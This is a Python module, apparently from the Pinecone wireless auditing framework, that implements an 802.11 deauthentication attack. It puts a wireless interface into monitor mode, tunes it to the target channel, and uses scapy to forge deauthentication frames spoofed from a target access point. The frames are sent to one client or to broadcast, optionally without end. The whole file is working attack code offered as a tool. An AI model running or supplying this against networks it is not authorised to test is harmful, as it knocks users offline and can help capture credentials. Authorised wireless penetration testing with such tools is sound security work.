import argparse

from pyric import pyw
from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

from pinecone.core.module import BaseModule
from pinecone.utils.interface import set_monitor_mode
from pinecone.utils.packet import BROADCAST_MAC


class Module(BaseModule):
    META = {
        "id": "attack/deauth",
        "name": "802.11 deauthentication attack module",
        "author": "Valentín Blanco (https://github.com/valenbg1/)",
        "version": "1.0.0",
        "description": "Deauthenticates clients from APs forging 802.11 deauthentication frames.",
        "options": argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter),
        "depends": {}
    }
    META["options"].add_argument("-i", "--iface", help="monitor mode capable WLAN interface", default="wlan0")
    META["options"].add_argument("-b", "--bssid", help="BSSID of target AP", required=True)
    META["options"].add_argument("-c", "--channel", help="channel of target AP", required=True, type=int)
    META["options"].add_argument("--client", help="MAC of target client", default=BROADCAST_MAC)
    META["options"].add_argument("-n", "--num-packets", help="number of deauth frames to send", default=10, type=int)

    def run(self, args, cmd):
        interface = set_monitor_mode(args.iface)
        pyw.chset(interface, args.channel)

        deauth_packet = RadioTap() / Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid) / Dot11Deauth()
        i = args.num_packets if args.num_packets > 0 else -1

        while i != 0:
            sendp(deauth_packet, iface=args.iface)

            if i != -1:
                i -= 1

    def stop(self, cmd):
        pass
